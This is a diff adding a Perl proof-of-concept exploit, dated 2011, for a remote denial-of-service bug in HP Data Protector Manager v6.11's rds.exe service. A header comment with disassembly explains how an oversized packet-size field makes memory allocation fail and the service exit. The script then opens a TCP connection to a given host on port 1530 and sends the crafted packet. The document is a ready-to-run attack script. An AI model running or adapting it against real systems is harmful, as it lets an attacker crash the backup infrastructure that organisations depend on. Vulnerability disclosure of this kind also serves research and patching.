@@ -1,0 +1,76 @@
+#!/usr/bin/perl
+
+# ===============================
+# HP Data Protector Manager v6.11
+# ===============================
+#
+# Bug: Remote Denial of Service Vulnerabilities (RDS Service)
+#
+# Software: http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html
+# Date: 08/01/2011
+# Authors: Roi Mallo - rmallof[AT]gmail[DOT]com
+#                   http://elotrolad0.blogspot.com/ - http://twitter.com/rmallof
+#              Pepelux - pepelux[AT]enye-sec[DOT]com
+#                   http://www.enye-sec.org - http://www.pepelux.org - http://twitter.com/pepeluxx
+#
+# Vulnerable file: Program Files\OmniBack\rds.exe
+#
+# Tested on Windows XP SP2 && Windows XP SP3
+#
+#
+# POC: 
+# _ncp32.dll is the responsable of waiting the packet (RECV)
+# when a packet is received, it uses _rm32.dll to allocating memory,
+# as the size is too big, malloc can't allocate this size and the program exit.
+#
+# _ncp32.dll
+# 00482F92   68 7DFAF908  	PUSH 8F9FA7D
+# 00482F97   6A 00            	PUSH 0
+# 00482F99   6A 01            	PUSH 1
+# 00482F9B   6A 00            	PUSH 0
+# 00482F9D   8B55 F8          	MOV EDX,DWORD PTR SS:[EBP-8] ; packet size (64000000h)
+# 00482FA0   52               		PUSH EDX
+# 00482FA1   E8 9C2D0000	CALL <JMP.&_rm32.#20_rm_getMem>
+#
+#
+# _rm32.dll
+# 0038C49B   8B45 08          	MOV EAX,DWORD PTR SS:[EBP+8] : packet size (64000000h)
+# 0038C49E   83C0 08          	ADD EAX,8
+# 0038C4A1   50               	PUSH EAX
+# 0038C4A2   FF15 F4733A00 CALL DWORD PTR DS:[<&MSVCR71.malloc>]    ; MSVCR71.malloc  --> Returns 0 because no space available
+# ......
+# 0038C5F9   50               		PUSH EAX
+# 0038C5FA   68 2C0C3A00  	PUSH _rm32.003A0C2C ; ASCII "rm_getMem: out of memory, allocating %u bytes. Called from %s"
+#......
+# 0038C64E   E8 8D220000      CALL _rm32.rm_errorExit
+
+
+
+use IO::Socket;
+
+my ($server, $port) = @ARGV ;
+
+unless($ARGV[0] || $ARGV[1]) {
+	print "Usage: perl $0 <host> [port]\n";
+	print "\tdefault port = 1530\n\n";
+	exit 1;
+}
+
+$port = 1530 if !($ARGV[1]);
+
+
+if ($^O =~ /Win/) {system("cls");}else{system("clear");}
+
+my $buf = "\x23\x8c\x29\xb6"; 	# header (always the same)
+$buf .= "\x64\x00\x00\x00"; 		# data packet size (too big)
+$buf .= "\x41"x4;						# data
+
+print "[+] Connecting to $server:$port ...\n";
+
+my $sock1 = new IO::Socket::INET (PeerAddr => $server, PeerPort => $port, Timeout => '10', Proto => 'tcp') or die("Server $server is not available.\n");
+
+print "[+] Sending malicious packet ...\n";
+print $sock1 "$buf";
+print "\n[x] Server crashed!\n"; 
+exit;
+
